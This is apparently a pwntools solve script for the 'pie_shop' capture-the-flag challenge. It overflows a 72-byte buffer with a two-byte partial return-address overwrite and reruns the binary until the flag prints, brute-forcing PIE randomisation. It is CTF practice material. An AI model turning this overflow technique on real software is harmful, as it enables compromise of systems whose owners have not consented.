from pwn import *
import sys


context.clear(arch='amd64')
# context.log_level='debug'

argv = sys.argv
REMOTE = False
DEBUG = True
binary_path = './pie_shop'

if len(argv) > 1:
	if argv[1] == 'remote':
		REMOTE = True
	if argv[1] == 'debug':
		DEBUG = True

if REMOTE:
	sh = remote('shell.actf.co', 19306)
else:
	sh = process(binary_path)


e = ELF(binary_path)

# -------- plan ---------
# bruteforce pie!

overflow_offset = 72
flag = '\xa9\x01'
counter = 1
output = ''

payload = 'A' * overflow_offset + flag

while "flag{" not in output:
	sh = process(binary_path)
	log.info('attempt {}'.format(counter))
	sh.sendlineafter('What type of pie do you want? ', payload)
	output = sh.recvall()
	sh.close()
	counter+=1

print(output)









